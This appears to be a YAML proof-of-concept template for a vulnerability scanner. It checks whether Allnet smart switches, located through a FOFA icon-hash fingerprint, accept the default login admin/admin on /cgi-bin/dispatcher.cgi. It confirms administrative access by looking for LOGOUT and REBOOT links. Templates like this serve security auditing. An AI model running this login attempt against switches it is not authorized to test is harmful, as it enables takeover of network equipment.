id: poc-yaml-allnet-intelligent-switch-default-password-login
info:
  name: Allnet 智能交换机 默认密码登录漏洞
  severity: high
  tags:
  - 弱口令
  finger: 智能交换机
  fofa: icon_hash="-121681558"
variables:
  paths: 'cmd=1

    cmd=3'
firstRequest:
  method: GET
  path: /cgi-bin/dispatcher.cgi?cmd=0
  expression: status_code == 200 && contains(title,"Login")
requests:
- method: POST
  path: /cgi-bin/dispatcher.cgi?{{.paths}}
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: username=admin&password=admin&login=1
  expression: status_code == 200 && contains(body,">LOGOUT</a>") && contains(body,"REBOOT</a>")
transport: http
